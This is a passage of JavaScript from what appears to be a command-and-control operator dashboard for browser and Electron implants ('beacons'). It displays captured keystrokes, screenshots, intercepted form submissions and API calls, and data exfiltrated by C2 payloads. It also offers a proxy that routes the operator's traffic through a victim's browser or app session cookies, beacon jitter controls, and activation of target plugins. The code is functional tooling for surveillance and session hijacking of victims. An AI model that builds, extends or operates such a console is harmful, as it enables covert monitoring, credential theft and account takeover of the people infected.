                activeEvent = true;
                screenshotReq  = await fetch('/api/clientScreenshot/' + eventKey);
                screenshotJson = await screenshotReq.json();

                cardTitle.innerHTML = "Screenshot";
                cardText.innerHTML  = '<a href="' + escapeHTML(screenshotJson.fileName) + '" target="_blank"><img src="' + escapeHTML(screenshotJson.fileName) + '" class="img-thumbnail"></a>';
            }
            break;

        case 'USERINPUT':
            if (document.getElementById('userInputEvents').checked == true)
            {
                activeEvent = true;
                userInputReq  = await fetch('/api/clientUserInput/' + eventKey);
                userInputJson = await userInputReq.json();

                cardTitle.innerHTML = "User Input";
                cardText.innerHTML  = "Input Name: <b>" + escapeHTML(userInputJson.inputName) + "</b>";
                cardText.innerHTML += "<br>";
                cardText.innerHTML += "Input Value: <b>" + escapeHTML(userInputJson.inputValue) + "</b>";
            }
            break;

        case 'FORMPOST':
            if (document.getElementById('formPostEvents').checked == true)
            {
                activeEvent = true;
                formPostReq  = await fetch('/api/clientFormPosts/' + eventKey);
                formPostJson = await formPostReq.json();

                cardTitle.innerHTML = "Network Form Submission";
                cardText.innerHTML  = "Form submission intercepted from browser networking API.<br><br>";
                _mimicData[eventKey] = { data: formPostJson, type: 'FORM' };
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm me-2" onclick="showFormPostViewer(\'' + escapeHTML(eventKey) + '\')">View Submission</button>';
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" onclick="showMimicFormModalFromStore(\'' + escapeHTML(eventKey) + '\')">Create Mimic Payload</button>';
            }
            break;

        case 'XHRAPICALL':
            if (document.getElementById('apiEvents').checked == true)
            {
                activeEvent = true;
                xhrCallReq  = await fetch('/api/clientXhrApiCall/' + eventKey);
                xhrCallJson = await xhrCallReq.json();

                cardTitle.innerHTML = "Network API Call (XHR)";
                cardText.innerHTML  = "Network API call intercepted via XHR monkeypatching.<br><br>";
                cardText.innerHTML += "URL: <b>" + escapeHTML(xhrCallJson.url) + "</b><br>";
                cardText.innerHTML += "Method: <b>" + escapeHTML(xhrCallJson.method) + "</b><br>";
                cardText.innerHTML += "Status Code: <b>" + escapeHTML(xhrCallJson.responseStatus) + "</b><br><br>";
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm me-2" onclick=showReqRespViewer(' + `'` + eventKey + `','XHR'`+ ')>View Details</button>';
                _mimicData[eventKey] = { data: xhrCallJson, type: 'XHR' };
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" onclick="showMimicApiModalFromStore(\'' + escapeHTML(eventKey) + '\')">Create Mimic Payload</button>';
            }
            break;

        case 'FETCHAPICALL':
            if (document.getElementById('apiEvents').checked == true)
            {
                activeEvent = true;
                fetchCallReq  = await fetch('/api/clientFetchApiCall/' + eventKey);
                fetchCallJson = await fetchCallReq.json();

                cardTitle.innerHTML = "Network API Call (Fetch)";
                cardText.innerHTML  = "Network API call intercepted via Fetch monkeypatching.<br><br>";
                cardText.innerHTML += "URL: <b>" + escapeHTML(fetchCallJson.url) + "</b><br>";
                cardText.innerHTML += "Method: <b>" + escapeHTML(fetchCallJson.method) + "</b><br>";
                cardText.innerHTML += "Status Code: <b>" + escapeHTML(fetchCallJson.responseStatus) + "</b><br><br>";
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm me-2" onclick=showReqRespViewer(' + `'` + eventKey + `','FETCH'`+ ')>View Details</button>';
                _mimicData[eventKey] = { data: fetchCallJson, type: 'FETCH' };
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" onclick="showMimicApiModalFromStore(\'' + escapeHTML(eventKey) + '\')">Create Mimic Payload</button>';
            }
            break;

        case 'CUSTOMEXFIL':
            if (document.getElementById('customExfilEvents').checked == true)
            {
                activeEvent = true;
                cardTitle.innerHTML = "Custom Payload Exfiltrated Data";
                cardText.innerHTML  = "Data sent back from a custom C2 payload.<br><br>";
                cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick=showExfilViewer(' + `'` + eventKey + `'`+ ')>View Data</button>';
            }
            break;

        case 'PLUGIN':
            if (document.getElementById('pluginEvents').checked == true)
            {
                activeEvent = true;
                var pluginDataReq = await fetch('/api/plugins/eventData/' + eventKey);
                if (pluginDataReq.ok) {
                    var pluginDataJson = await pluginDataReq.json();
                    var pName = pluginDataJson.pluginId || 'unknown';
                    var pType = pluginDataJson.dataType || '';
                    cardTitle.innerHTML = "Plugin: " + escapeHTML(pName);
                    if (pType === '_error') {
                        cardText.innerHTML = '<span class="text-danger">Plugin Error</span><br>';
                        cardText.innerHTML += '<pre class="small mt-1 mb-0" style="max-height:120px;overflow:auto">' + escapeHTML(JSON.stringify(pluginDataJson.data, null, 2)) + '</pre>';
                    } else {
                        cardText.innerHTML = "Type: <b>" + escapeHTML(pType) + "</b><br>";
                        cardText.innerHTML += '<pre class="small mt-1 mb-0" style="max-height:120px;overflow:auto">' + escapeHTML(JSON.stringify(pluginDataJson.data, null, 2)) + '</pre>';
                    }
                } else {
                    cardTitle.innerHTML = "Plugin Data";
                    cardText.innerHTML = "Event ID: " + escapeHTML(eventKey);
                }
            }
            break;

        case 'KEYLOG':
            if (document.getElementById('keylogEvents').checked == true)
            {
                activeEvent = true;
                keylogReq  = await fetch('/api/clientKeylog/' + eventKey);
                keylogJson = await keylogReq.json();

                cardTitle.innerHTML = "Keylog";
                cardText.innerHTML  = "Target: <b>" + escapeHTML(keylogJson.target) + "</b>";
                cardText.innerHTML += "<br>";
                cardText.innerHTML += "Keystrokes: <b>" + escapeHTML(keylogJson.keys) + "</b>";
                if (keylogJson.url) {
                    cardText.innerHTML += "<br>";
                    cardText.innerHTML += "URL: <b>" + escapeHTML(keylogJson.url) + "</b>";
                }
            }
            break;

        default:
            console.log("Error: unknown event type received from server: " + event.eventType);
        }


        if (activeEvent)
        {
            cardSubtitle.innerHTML  = "Event Time: <b>" + humanized_time_span(event.timeStamp) + "</b>";

            cardBody.appendChild(cardTitle);
            cardBody.appendChild(cardSubtitle);
            cardBody.appendChild(cardText);

            card.appendChild(cardBody);

            // Auto-refresh with newest-first: prepend new events at top
            if (autoRefresh && isRefresh && newestFirst && cardStack.firstChild) {
                cardStack.insertBefore(card, cardStack.firstChild);
            } else {
                cardStack.appendChild(card);
            }
        }
        }

        // Enforce tab visibility for clients with tools
        if (client && (client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon' || client.clientType === 'js-implant')) {
            switchBexTab(activeBexTab);
        }
    } finally {
        refreshingDetails = false;
    }
}





// ---------------------------------------------------------------------------
// Proxy panel for beacon detail view
// ---------------------------------------------------------------------------

async function renderProxyPanel(cardStack, beaconId, client) {
    let panel = document.getElementById('proxy-panel');
    var isAtom = client && (client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon');

    // Fetch proxy status for this specific beacon
    var statusResp = await fetch('/api/proxy/status?beaconID=' + encodeURIComponent(beaconId));
    var proxyStatus = await statusResp.json();

    var isActive = proxyStatus.running;
    var wsConnected = proxyStatus.wsConnected;
    var proxyPort = proxyStatus.port;

    if (!panel) {
        panel = document.createElement('div');
        panel.id = 'proxy-panel';
        panel.className = 'card mb-3 border-secondary';
        cardStack.prepend(panel);
    }

    // Status badge
    var statusBadge = '';
    if (isActive) {
        if (wsConnected) {
            statusBadge = '<span class="badge bg-success">Connected</span>';
        } else {
            statusBadge = '<span class="badge bg-warning text-dark">Waiting for beacon...</span>';
        }
    }

    var panelTitle = client && client.clientType === 'v8-beacon' ? 'V8 Proxy'
        : client && client.clientType === 'atom-beacon' ? 'Atom Proxy'
        : client && client.clientType === 'bex-beacon' ? 'BEX Proxy'
        : 'DOM Proxy';
    var panelDesc = isAtom
        ? client && client.clientType === 'v8-beacon'
            ? "Route your browser traffic through this Node.js process. Requests execute with the process's network context."
            : "Route your browser traffic through this Electron app. Requests execute with the app's full session cookies and network context."
        : "Route your browser traffic through this beacon. Requests are fetched from the victim's browser/IP via WebSocket.";

    panel.innerHTML = `
        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
            <span><b>${panelTitle}</b> ${statusBadge}</span>
        </div>
        <div class="card-body p-3">
            <p class="small text-muted mb-2">${panelDesc}</p>
            <div class="d-flex gap-2 align-items-center mb-2">
                ${isActive
                    ? '<button class="btn btn-secondary btn-sm" id="proxy-stop-btn">Stop Proxy</button>'
                    : '<button class="btn btn-primary btn-sm" id="proxy-start-btn">Start Proxy</button>'
                }
                ${isActive ? '<button class="btn btn-primary btn-sm" onclick="downloadCaCert()">Download CA Cert</button>' : ''}
                ${isActive ? '<button class="btn btn-primary btn-sm" onclick="generateProxyTicket(\'' + beaconId + '\')">Proxy Ticket</button>' : ''}
                ${isActive && proxyPort ? '<span class="small text-muted ms-auto">Port: <b>' + proxyPort + '</b></span>' : ''}
            </div>
        </div>
    `;

    // Wire up start/stop buttons
    var startBtn = document.getElementById('proxy-start-btn');
    if (startBtn) {
        startBtn.onclick = async function() {
            startBtn.disabled = true;
            startBtn.textContent = 'Starting...';
            var resp = await fetch('/api/proxy/start', {
                method: 'POST',
                body: JSON.stringify({ beaconID: beaconId }),
                headers: { "Content-type": "application/json; charset=UTF-8" }
            });
            var data = await resp.json();
            showToast('Proxy started on port ' + (data.port || '?'));
            getClientDetails(beaconId);
        };
    }

    var stopBtn = document.getElementById('proxy-stop-btn');
    if (stopBtn) {
        stopBtn.onclick = async function() {
            stopBtn.disabled = true;
            stopBtn.textContent = 'Stopping...';
            await fetch('/api/proxy/stop', {
                method: 'POST',
                body: JSON.stringify({ beaconID: beaconId }),
                headers: { "Content-type": "application/json; charset=UTF-8" }
            });
            showToast('Proxy stopped');
            getClientDetails(beaconId);
        };
    }

    return { isActive: isActive };
}


function renderBeaconCallbackPanel(cardStack, beaconId, clientType) {
    var panel = document.getElementById('beacon-callback-panel');
    if (panel) return; // Already rendered

    var isAtom = clientType === 'atom-beacon' || clientType === 'v8-beacon';
    var isImplant = clientType === 'js-implant';
    var defaultBase = isAtom ? 2 : (isImplant ? 2 : 5);
    var defaultJitter = isAtom ? 10 : (isImplant ? 0 : 30);

    panel = document.createElement('div');
    panel.id = 'beacon-callback-panel';
    panel.className = 'card mb-3 border-secondary';
    panel.style.overflow = 'hidden';
    panel.innerHTML = `
        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer" data-bs-toggle="collapse" data-bs-target="#beacon-callback-collapse" aria-expanded="false" aria-controls="beacon-callback-collapse">
            <span><b>Beacon Callback</b></span>
            <svg id="beacon-callback-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(-90deg);">
                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
            </svg>
        </div>
        <div class="collapse" id="beacon-callback-collapse">
        <div class="card-body p-3">
            <div class="mb-2 small text-muted" id="beacon-callback-current">Current: loading...</div>
            <div class="d-flex align-items-center" style="gap:8px">
                <label class="small text-muted text-nowrap mb-0">Interval:</label>
                <input type="number" class="form-control form-control-sm" id="beacon-callback-base" value="${defaultBase}" min="0.5" step="0.5" style="width:80px;">
                <span class="small text-muted">sec</span>
                <label class="small text-muted text-nowrap mb-0 ms-2">Jitter:</label>
                <input type="number" class="form-control form-control-sm" id="beacon-callback-jitter" value="${defaultJitter}" min="0" max="100" step="5" style="width:70px;">
                <span class="small text-muted">%</span>
                <button class="btn btn-primary btn-sm ms-2" id="beacon-callback-apply-btn">Apply</button>
                <span class="small ms-2" id="beacon-callback-status"></span>
            </div>
        </div>
        </div>
    `;
    cardStack.appendChild(panel);

    // Chevron rotation
    var collapseEl = document.getElementById('beacon-callback-collapse');
    if (collapseEl) {
        collapseEl.addEventListener('hide.bs.collapse', function() {
            var chev = document.getElementById('beacon-callback-chevron');
            if (chev) chev.style.transform = 'rotate(-90deg)';
        });
        collapseEl.addEventListener('show.bs.collapse', function() {
            var chev = document.getElementById('beacon-callback-chevron');
            if (chev) chev.style.transform = 'rotate(0deg)';
        });
    }

    // Fetch current heartbeat values
    var baseInput = document.getElementById('beacon-callback-base');
    var jitterInput = document.getElementById('beacon-callback-jitter');
    var currentEl = document.getElementById('beacon-callback-current');
    var defaultLabel = defaultBase + 's / ' + defaultJitter + '% jitter (defaults)';

    fetch('/api/beacon/heartbeat/' + beaconId).then(function(r) { return r.json(); }).then(function(resp) {
        if (resp.found && resp.data) {
            var d = resp.data;
            if (baseInput) baseInput.value = d.baseInterval;
            if (jitterInput) jitterInput.value = d.jitterPercent;
            if (currentEl) currentEl.textContent = 'Current: ' + d.baseInterval + 's / ' + d.jitterPercent + '% jitter';
        } else {
            if (currentEl) currentEl.textContent = 'Current: ' + defaultLabel;
        }
    }).catch(function() {
        if (currentEl) currentEl.textContent = 'Current: unable to fetch';
    });

    // Apply button
    var applyBtn = document.getElementById('beacon-callback-apply-btn');
    var statusEl = document.getElementById('beacon-callback-status');
    var _hbPollTimer = null;
    var _lastResultId = null;

    // Store the last known result ID so we can detect new results
    fetch('/api/beacon/heartbeat/' + beaconId).then(function(r) { return r.json(); }).then(function(resp) {
        if (resp.found) _lastResultId = resp.id;
    }).catch(function() {});

    if (applyBtn) {
        applyBtn.onclick = function() {
            var base = parseFloat(baseInput ? baseInput.value : String(defaultBase));
            var jitter = parseFloat(jitterInput ? jitterInput.value : String(defaultJitter));
            if (isNaN(base) || base < 0.5) { if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">Min 0.5s</span>'; return; }
            if (isNaN(jitter) || jitter < 0 || jitter > 100) { if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">Jitter 0-100</span>'; return; }

            fetch('/api/beacon/heartbeat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ clientID: beaconId, baseInterval: base, jitterPercent: jitter })
            }).then(function(r) {
                if (!r.ok) throw new Error('Failed to queue');
                return r.json();
            }).then(function() {
                if (statusEl) statusEl.innerHTML = '<span class="text-muted"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.65rem;height:0.65rem"></span>Queued...</span>';

                var polls = 0;
                if (_hbPollTimer) clearInterval(_hbPollTimer);
                _hbPollTimer = setInterval(function() {
                    polls++;
                    if (polls > 15) {
                        clearInterval(_hbPollTimer);
                        _hbPollTimer = null;
                        if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">Timed out</span>';
                        return;
                    }
                    fetch('/api/beacon/heartbeat/' + beaconId).then(function(r) { return r.json(); }).then(function(resp) {
                        if (resp.found && resp.id !== _lastResultId) {
                            clearInterval(_hbPollTimer);
                            _hbPollTimer = null;
                            _lastResultId = resp.id;
                            var d = resp.data;
                            if (d.success) {
                                if (baseInput) baseInput.value = d.baseInterval;
                                if (jitterInput) jitterInput.value = d.jitterPercent;
                                if (currentEl) currentEl.textContent = 'Current: ' + d.baseInterval + 's / ' + d.jitterPercent + '% jitter';
                                if (statusEl) statusEl.innerHTML = '<span style="color:#62c462">Applied: ' + d.baseInterval + 's / ' + d.jitterPercent + '%</span>';
                            } else {
                                if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">' + (d.error || 'Failed') + '</span>';
                            }
                        }
                    }).catch(function() {});
                }, 1000);
            }).catch(function(e) {
                if (statusEl) statusEl.innerHTML = '<span style="color:#ee5f5b">Error: ' + e.message + '</span>';
            });
        };
    }
}

function renderScreenshotPanel(cardStack, beaconId) {
    var panel = document.getElementById('screenshot-panel');
    if (panel) return; // Already rendered

    panel = document.createElement('div');
    panel.id = 'screenshot-panel';
    panel.className = 'card mb-3 border-secondary';
    panel.style.overflow = 'hidden';
    panel.innerHTML = `
        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer" data-bs-toggle="collapse" data-bs-target="#screenshot-collapse" aria-expanded="false" aria-controls="screenshot-collapse">
            <span><b>Screenshots</b></span>
            <svg id="screenshot-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(-90deg);">
                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
            </svg>
        </div>
        <div class="collapse" id="screenshot-collapse">
        <div class="card-body p-3">
            <div class="mb-3">
                <button class="btn btn-primary btn-sm" id="sidecar-screenshot-btn" onclick="atomCaptureScreenshot('${beaconId}')">Capture Now</button>
                <span id="sidecar-screenshot-status" class="ms-2 small text-muted"></span>
            </div>
            <div class="mb-3 border-top pt-2">
                <div class="form-check form-switch mb-1">
                    <input class="form-check-input" type="checkbox" id="atom-ss-on-focus" checked>
                    <label class="form-check-label small" for="atom-ss-on-focus">Capture on window focus</label>
                </div>
                <div class="form-check form-switch mb-1">
                    <input class="form-check-input" type="checkbox" id="atom-ss-on-navigate" checked>
                    <label class="form-check-label small" for="atom-ss-on-navigate">Capture on navigation</label>
                </div>
                <div class="form-check form-switch mb-1">
                    <input class="form-check-input" type="checkbox" id="atom-ss-on-newwindow" checked>
                    <label class="form-check-label small" for="atom-ss-on-newwindow">Capture on new window</label>
                </div>
                <div class="d-flex align-items-center gap-2 mt-2">
                    <label class="small text-muted text-nowrap" for="atom-ss-cooldown">Cooldown (sec):</label>
                    <input type="number" class="form-control form-control-sm" id="atom-ss-cooldown" value="30" min="5" max="600" style="width:80px;">
                </div>
            </div>
            <div class="d-flex gap-2">
                <button class="btn btn-secondary btn-sm" onclick="atomSaveScreenshotSettings('${beaconId}')">Save Settings</button>
                <span id="atom-ss-settings-status" class="small text-muted align-self-center"></span>
            </div>
        </div>
        </div>
    `;
    cardStack.appendChild(panel);

    // Chevron rotation
    var collapseEl = document.getElementById('screenshot-collapse');
    if (collapseEl) {
        collapseEl.addEventListener('hide.bs.collapse', function() {
            var chev = document.getElementById('screenshot-chevron');
            if (chev) chev.style.transform = 'rotate(-90deg)';
        });
        collapseEl.addEventListener('show.bs.collapse', function() {
            var chev = document.getElementById('screenshot-chevron');
            if (chev) chev.style.transform = 'rotate(0deg)';
        });
    }
}

function renderDomScreenshotPanel(cardStack, clientId) {
    var panel = document.getElementById('dom-screenshot-panel');
    if (panel) return; // Already rendered

    panel = document.createElement('div');
    panel.id = 'dom-screenshot-panel';
    panel.className = 'card mb-3 border-secondary';
    panel.style.overflow = 'hidden';
    panel.innerHTML = `
        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer" data-bs-toggle="collapse" data-bs-target="#dom-screenshot-collapse" aria-expanded="false" aria-controls="dom-screenshot-collapse">
            <span><b>Screenshots</b></span>
            <svg id="dom-screenshot-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(-90deg);">
                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
            </svg>
        </div>
        <div class="collapse" id="dom-screenshot-collapse">
        <div class="card-body p-3">
            <div class="mb-2">
                <button class="btn btn-primary btn-sm" id="dom-screenshot-btn">Capture Now</button>
                <span id="dom-screenshot-status" class="ms-2 small text-muted"></span>
            </div>
            <div class="small text-muted">Triggers an html2canvas screenshot on the target page. The result appears as a SCREENSHOT event in the Loot tab.</div>
        </div>
        </div>
    `;
    cardStack.appendChild(panel);

    // Chevron rotation
    var collapseEl = document.getElementById('dom-screenshot-collapse');
    if (collapseEl) {
        collapseEl.addEventListener('hide.bs.collapse', function() {
            var chev = document.getElementById('dom-screenshot-chevron');
            if (chev) chev.style.transform = 'rotate(-90deg)';
        });
        collapseEl.addEventListener('show.bs.collapse', function() {
            var chev = document.getElementById('dom-screenshot-chevron');
            if (chev) chev.style.transform = 'rotate(0deg)';
        });
    }

    // Capture button
    var btn = document.getElementById('dom-screenshot-btn');
    if (btn) {
        btn.onclick = function() {
            btn.disabled = true;
            var status = document.getElementById('dom-screenshot-status');
            fetch('/api/dom/screenshot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ clientID: clientId })
            }).then(function(r) {
                if (!r.ok) throw new Error('Failed to queue');
                return r.json();
            }).then(function() {
                if (status) status.innerHTML = '<span class="text-muted">Queued &mdash; will appear in Loot tab on next heartbeat</span>';
                btn.disabled = false;
            }).catch(function(err) {
                if (status) status.innerHTML = '<span style="color:#ee5f5b">Error: ' + err.message + '</span>';
                btn.disabled = false;
            });
        };
    }
}


async function renderPluginPanel(cardStack, beaconId, client) {
    var panel = document.getElementById('plugin-panel');

    // Fetch available plugins
    var pluginsResp = await fetch('/api/plugins');
    var allPlugins = await pluginsResp.json();
    if (!allPlugins || allPlugins.length === 0) return;

    // Fetch active plugins for this client
    var activeResp = await fetch('/api/plugins/client/' + encodeURIComponent(beaconId));
    var activePlugins = await activeResp.json();
    var activeMap = {};
    activePlugins.forEach(function(ap) { activeMap[ap.pluginId] = ap; });

    // Skip full rebuild if panel exists with same active state (prevents clobbering plugin UI tabs)
    if (panel && panel.getAttribute('data-active-state')) {
        var currentState = activePlugins.map(function(a) { return a.pluginId; }).sort().join(',');
        if (panel.getAttribute('data-active-state') === currentState) {
            // Just update the count badge
            return;
        }
    }

    if (!panel) {
        panel = document.createElement('div');
        panel.id = 'plugin-panel';
        panel.className = 'card mb-3 border-secondary';
        panel.style.overflow = 'hidden';
        cardStack.appendChild(panel);
    }

    var pluginListHtml = '';

    for (var i = 0; i < allPlugins.length; i++) {
        var p = allPlugins[i];
        var isActive = !!activeMap[p.id];
        var statusBadge = isActive
            ? '<span class="badge bg-success">Active</span>'
            : '<span class="badge bg-secondary">Inactive</span>';

        var actionBtn = isActive
            ? '<button class="btn btn-secondary btn-sm plugin-deactivate-btn" data-plugin-id="' + escapeHTML(p.id) + '">Deactivate</button>'
            : '<button class="btn btn-primary btn-sm plugin-activate-btn" data-plugin-id="' + escapeHTML(p.id) + '">Activate</button>';

        var targetApps = (p.targetApps || []).map(function(t) { return escapeHTML(t); }).join(', ');
        var settingsHtml = '';
        if (p.settings && p.settings.length > 0 && !isActive) {
            var collapseId = 'plugin-settings-collapse-' + escapeHTML(p.id);
            settingsHtml = '<div class="mt-2">' +
                '<span class="small" style="cursor:pointer;color:#7a8288" data-bs-toggle="collapse" data-bs-target="#' + collapseId + '" role="button" aria-expanded="false" aria-controls="' + collapseId + '">' +
                '<svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor" style="transition:transform 0.2s;margin-right:4px" class="plugin-settings-chevron"><path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"/></svg>' +
                'Settings</span>' +
                '<div class="collapse" id="' + collapseId + '">' +
                '<div class="plugin-settings-form mt-1" data-plugin-id="' + escapeHTML(p.id) + '">';
            for (var s = 0; s < p.settings.length; s++) {
                var setting = p.settings[s];
                var defaultVal = setting.default !== undefined ? setting.default : '';
                settingsHtml += '<div class="mb-1"><label class="form-label small mb-0">' + escapeHTML(setting.label) + '</label>';
                settingsHtml += '<input class="form-control form-control-sm" style="max-width:260px" data-setting-key="' + escapeHTML(setting.key) + '" type="' + (setting.type === 'number' ? 'number' : 'text') + '" value="' + escapeHTML(String(defaultVal)) + '"></div>';
            }
            settingsHtml += '</div></div></div>';
        }

        pluginListHtml += '<div class="card border-secondary mb-2" style="background:#272b30">' +
            '<div class="card-body p-2">' +
            '<div class="d-flex justify-content-between align-items-center">' +
            '<div class="d-flex align-items-center gap-2"><b class="text-white">' + escapeHTML(p.name) + '</b> ' + statusBadge +
            ' <span class="text-muted small">v' + escapeHTML(p.version || '?') + '</span></div>' +
            '<div class="ms-2">' + actionBtn + '</div>' +
            '</div>' +
            (isActive ? '<div class="small text-muted mt-1">' + escapeHTML(p.description || '') + '</div>' : '') +
            (isActive && targetApps ? '<div class="small text-muted">Targets: ' + targetApps + '</div>' : '') +
            settingsHtml +
            (isActive && p.capabilities && p.capabilities.ui ? '<div class="plugin-ui-container p-2 mt-2" id="plugin-ui-' + escapeHTML(p.id) + '"></div>' : '') +
            '</div></div>';
    }

    // Store active state for skip-rebuild check
    var activeStateKey = activePlugins.map(function(a) { return a.pluginId; }).sort().join(',');
    panel.setAttribute('data-active-state', activeStateKey);

    var isExpanded = panel.hasAttribute('data-expanded');
    panel.innerHTML =
        '<div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer" data-bs-toggle="collapse" data-bs-target="#plugin-collapse" aria-expanded="' + (isExpanded ? 'true' : 'false') + '" aria-controls="plugin-collapse">' +
        '<span><b>Atom Plugins</b></span>' +
        '<svg id="plugin-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(' + (isExpanded ? '0' : '-90') + 'deg);"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/></svg>' +
        '</div>' +
        '<div class="collapse' + (isExpanded ? ' show' : '') + '" id="plugin-collapse">' +
        '<div class="card-body p-3">' + pluginListHtml + '</div></div>';

    // Chevron rotation on collapse/expand
    var pluginCollapseEl = document.getElementById('plugin-collapse');
    if (pluginCollapseEl) {
        pluginCollapseEl.addEventListener('show.bs.collapse', function() {
            var chev = document.getElementById('plugin-chevron');
            if (chev) chev.style.transform = 'rotate(0deg)';
            panel.setAttribute('data-expanded', '1');
        });
        pluginCollapseEl.addEventListener('hide.bs.collapse', function() {
            var chev = document.getElementById('plugin-chevron');
            if (chev) chev.style.transform = 'rotate(-90deg)';
            panel.removeAttribute('data-expanded');
        });
    }

    // Wire up activate buttons
    var activateBtns = panel.querySelectorAll('.plugin-activate-btn');
    activateBtns.forEach(function(btn) {
        btn.onclick = async function() {
            var pluginId = btn.getAttribute('data-plugin-id');
            btn.disabled = true;
            btn.textContent = 'Activating...';

            // Gather settings from form
            var settings = {};
            var form = panel.querySelector('.plugin-settings-form[data-plugin-id="' + pluginId + '"]');
            if (form) {
                var inputs = form.querySelectorAll('input[data-setting-key]');
                inputs.forEach(function(input) {
                    var key = input.getAttribute('data-setting-key');
                    var val = input.type === 'number' ? Number(input.value) : input.value;
                    settings[key] = val;
                });
            }

            await fetch('/api/plugins/' + pluginId + '/activate', {
                method: 'POST',
                body: JSON.stringify({ clientID: beaconId, settings: settings }),
                headers: { "Content-type": "application/json; charset=UTF-8" }
            });
            showToast('Plugin ' + pluginId + ' activated');
            getClientDetails(beaconId);
        };
    });

    // Wire up deactivate buttons
    var deactivateBtns = panel.querySelectorAll('.plugin-deactivate-btn');
    deactivateBtns.forEach(function(btn) {
        btn.onclick = async function() {
            var pluginId = btn.getAttribute('data-plugin-id');
            btn.disabled = true;
            btn.textContent = 'Deactivating...';
            await fetch('/api/plugins/' + pluginId + '/deactivate', {
                method: 'POST',
                body: JSON.stringify({ clientID: beaconId }),
                headers: { "Content-type": "application/json; charset=UTF-8" }
            });
            showToast('Plugin ' + pluginId + ' deactivated');
            getClientDetails(beaconId);
        };
    });

    // Wire settings collapse chevron rotation
    var settingsCollapses = panel.querySelectorAll('[id^="plugin-settings-collapse-"]');
    settingsCollapses.forEach(function(collapseEl) {
        var wrapper = collapseEl.parentElement;
        var chevron = wrapper ? wrapper.querySelector('.plugin-settings-chevron') : null;
        collapseEl.addEventListener('show.bs.collapse', function() {
            if (chevron) chevron.style.transform = 'rotate(90deg)';
        });
        collapseEl.addEventListener('hide.bs.collapse', function() {
            if (chevron) chevron.style.transform = 'rotate(0deg)';
        });
    });

    // Load custom UI for active plugins
    for (var j = 0; j < allPlugins.length; j++) {
        var ap = allPlugins[j];
        if (activeMap[ap.id] && ap.capabilities && ap.capabilities.ui) {
            var container = document.getElementById('plugin-ui-' + ap.id);
            if (container) {
                await loadPluginUI(ap.id, container, beaconId);
            }
        }
    }
}


async function loadPluginUI(pluginId, containerEl, clientId) {
    var resp = await fetch('/api/plugins/' + pluginId + '/ui');
    if (!resp.ok) return;
    var uiData = await resp.json();

    var pluginDiv = document.createElement('div');
    pluginDiv.innerHTML = uiData.html || '';
    containerEl.appendChild(pluginDiv);

    if (uiData.hasJs) {
        // Set up global registry so the served script can find its API
        if (!window.__pluginUIRegistry) window.__pluginUIRegistry = {};
        window.__pluginUIRegistry[pluginId] = {
            pluginId: pluginId,
            clientId: clientId,
            container: pluginDiv,
            fetchData: function(dataType, limit, offset) {
                var url = '/api/plugins/' + pluginId + '/data/' + encodeURIComponent(clientId) + '?limit=' + (limit || 100) + '&offset=' + (offset || 0);
                if (dataType) url += '&dataType=' + encodeURIComponent(dataType);
                return fetch(url).then(function(r) { return r.json(); });
            },
            deleteData: function() {
                return fetch('/api/plugins/' + pluginId + '/data/' + encodeURIComponent(clientId), { method: 'DELETE' }).then(function(r) { return r.json(); });
            }
        };

        // Load plugin JS as a real script (CSP-compliant, no eval)
        return new Promise(function(resolve) {
            var script = document.createElement('script');
            script.src = '/api/plugins/' + pluginId + '/ui.js?t=' + Date.now();
            script.onload = function() {
                // Clean up: remove old scripts for this plugin to avoid duplicates on refresh
                script.remove();
                resolve();
            };
            script.onerror = function() {
                console.error('Failed to load plugin UI script for ' + pluginId);
                script.remove();
                resolve();
            };
            document.head.appendChild(script);
        });
    }
}


function unselectAllClients()
{
	// Remove detail cards
	detailCardStack = document.getElementById('detail-stack');
